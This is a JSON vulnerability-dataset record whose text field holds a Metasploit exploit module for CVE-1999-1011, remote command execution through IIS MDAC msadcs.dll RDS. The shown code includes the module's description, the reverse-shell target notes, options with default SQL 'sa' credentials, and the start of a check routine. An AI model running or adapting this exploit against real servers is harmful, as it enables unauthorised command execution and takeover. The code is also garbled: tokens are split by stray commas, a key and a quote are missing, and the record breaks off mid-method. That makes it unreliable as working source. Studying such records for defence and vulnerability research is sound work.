{
    "text": "vul_name : Microsoft ( win2000 ) IIS MDAC msadcs.dll RDS Remote Command Execution ， vul_cve : CVE-1999-1011 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， require 'rex/proto/tftp' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStagerTFTP ， def initialize ， super (  ， 'Name' => 'Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution' ,  ， 'Description' => %q{ ， This module can be used to execute arbitrary commands on IIS servers ， that expose the /msadc/msadcs.dll Microsoft Data Access Components ，  ( MDAC ) Remote Data Service ( RDS ) DataFactory service using VbBusObj ， or AdvancedDataFactory to inject shell commands into Microsoft Access ， databases ( MDBs )  , MSSQL databases and ODBC/JET Data Source Name ( DSN ) . ， Based on the msadcs.pl v2 exploit by Rain.Forest.Puppy , which was actively ， used in the wild in the late Ninties. MDAC versions affected include MDAC ， 1.5 , 2.0 , 2.0 SDK , 2.1 and systems with the MDAC Sample Pages for RDS ， installed , and NT4 Servers with the NT Option Pack installed or upgraded ， 2000 systems often running IIS3/4/5 however some vulnerable installations ， can still be found on newer Windows operating systems. Note that newer ， releases of msadcs.dll can still be abused however by default remote ， connections to the RDS is denied. Consider using VERBOSE if you're unable ， to successfully execute a command , as the error messages are detailed ， and useful for debugging. Also set NAME to obtain the remote hostname ,  ， and METHOD to use the alternative VbBusObj technique. ， } ,  ， 'Author' => 'patrick' ,  ， 'Platform' => 'win' ,  ， ' ，  [  ，  [ 'OSVDB' , '272' ]  ,  ，  [ 'BID' , '529' ]  ,  ，  [ 'CVE' , '1999-1011' ]  ,  ，  [ 'MSB' , 'ms98-004' ]  ,  ，  [ 'MSB' , 'ms99-025' ]  ，  ]  ,  ， 'Targets' => ，  [  ，  # patrickw tested meterpreter OK 20120601 ，  # nt4server w/sp3 , ie4.02 , option pack , IIS4.0 , mdac 1.5 , over msaccess shell , reverse_nonx ，  # w2k w/sp0 , IIS5.0 , mdac 2.7 RTM , sql2000 , handunsf.reg , over xp_cmdshell , reverse_tcp ，  [ 'Automatic' , { } ]  ,  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Jul 17 1998' ， register_options (  ，  [  ， OptString.new ( 'PATH' ,  [ true , \"The path to msadcs.dll\" , '/msadc/msadcs.dll' ]  )  ,  ， OptBool.new ( 'METHOD' ,  [ true , \"If true , use VbBusObj instead of AdvancedDataFactory\" , false ]  )  ,  ， OptBool.new ( 'NAME' ,  [ true , \"If true , attempt to obtain the MACHINE NAME\" , false ]  )  ,  ， OptString.new ( 'DBHOST' ,  [ true , \"The SQL Server host\" , 'local' ]  )  ,  ， OptString.new ( 'DBNAME' ,  [ true , \"The SQL Server database\" , 'master' ]  )  ,  ， OptString.new ( 'DBUID' ,  [ true , \"The SQL Server uid ( default is sa ) \" , 'sa' ]  )  ,  ， OptString.new ( 'DBPASSWORD' ,  [ false , \"The SQL Server password ( default is blank ) \" , ' ]  )  ,  ，  ]  , self.class )  ， end ， def check ， res = send_request_raw ( { ， 'uri' => datastore [ 'PATH' ]  ,  ， 'method' => 'GET' ,  ， } )  ， print_status ( \"Server responded with HTTP # {res.code} OK\" )  ， print_good ( \" # {datastore [ 'PATH' ] } matches fingerprint application\\/x-varg\" ) ",
    "time": "2012.06.08"
}